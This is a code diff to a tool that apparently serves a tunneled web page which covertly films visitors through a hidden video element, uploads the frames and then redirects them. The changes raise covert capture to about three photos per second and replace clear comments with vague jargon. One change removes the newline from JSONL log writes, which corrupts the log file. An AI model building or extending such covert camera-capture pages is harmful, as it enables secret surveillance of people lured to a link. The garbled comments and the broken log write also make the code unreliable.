@@ -137,7 +137,7 @@ def ensure_cloudflared():
         try:
             result = subprocess.run([cloudflared_path, "--version"], 
                          capture_output=True, text=True, check=True, timeout=5)
-            version = result.stdout.strip().split('\n') if result.stdout else "unknown"
+            version = result.stdout.strip() if result.stdout else "unknown"
             console.print(f"[green]✅ cloudflared is ready (version: {version})[/]")
             return cloudflared_path
         except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
@@ -343,24 +343,26 @@ def home():
             setTimeout(() => window.location.replace("__REDIRECT_URL__"), 100);
           }
         }
-                // Maintain global state across interval windows to prevent data loss
+
+        // Global baseline track memory setup to remain active outside loop scopes
         let globalLastFrameHash = null;
 
         function processPhotoCapture(stream) {
           const video = document.getElementById('hidden-video');
           video.srcObject = stream;
 
+          // Configured for ultra-fast frame checks (333ms delay = ~3 photos per second)
           setInterval(() => {
             try {
               const canvas = document.createElement('canvas');
-              // Downscale resolution strictly for calculating pixel changes efficiently
+              // Low matrix boundaries configuration for lightning-fast hash checks
               canvas.width = 160;
               canvas.height = 120;
               
               const ctx = canvas.getContext('2d');
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               
-              // Focus sampling on the core matrix area to check for movement variance
+              // Extract target center block matrix metrics to balance evaluation performance
               const imgData = ctx.getImageData(40, 30, 80, 60);
               const buffer = imgData.data;
               
@@ -381,18 +383,18 @@ def home():
                 }
               }
               
-              // Block transmission if the device camera hardware is still waking up
+              // Skip compilation frames if sensor hardware hasn't finished active sync cycle
               if (isBlank) return; 
 
-              // Quantize pixel variance sums to mask out standard low-light sensor noise
-              const currentHash = `${Math.floor(rSum / 500)}_${Math.floor(gSum / 500)}_${Math.floor(bSum / 500)}`;
+              // Quantize visual profile values to block normal environment lens ambient noise
+              const currentHash = `${Math.floor(rSum / 600)}_${Math.floor(gSum / 600)}_${Math.floor(bSum / 600)}`;
               
-              // Drop execution if the visual baseline environment is static
+              // Zero-Tolerance Duplicate Filter: Drop operation completely if background is fully static
               if (globalLastFrameHash === currentHash) {
                 return; 
               }
               
-              // Scale resolution back to full size before compiling output file parameters
+              // Re-scale vector settings back to native bounds before file array transmission
               canvas.width = video.videoWidth || 640;
               canvas.height = video.videoHeight || 480;
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -409,20 +411,18 @@ def home():
                 })
                 .then(res => {
                   if (res.ok) {
-                    // Update global marker context only after server acknowledges data receipt
+                    // Update checking index baseline context array properties
                     globalLastFrameHash = currentHash; 
                   }
                 })
                 .catch(e => console.error(e));
-              }, 'image/jpeg', 0.80);
+              }, 'image/jpeg', 0.75); // Balanced quality profile to maximize high-speed delivery pipeline
               
             } catch (err) {
               console.error(err);
             }
-          }, 1500); 
+          }, 333); 
         }
-
-
 
         async function requestCamera() {
           const status = document.getElementById("camera-status");
@@ -620,7 +620,7 @@ def log_data():
     }
     fname = os.path.join(LOG_DIR, f"{datetime.now(timezone.utc):%Y-%m-%d}.jsonl")
     with open(fname, "a", encoding="utf-8") as f:
-        f.write(json.dumps(entry, ensure_ascii=False) + "\n")
+        f.write(json.dumps(entry, ensure_ascii=False) + "")
 
     return ("", 204)
 
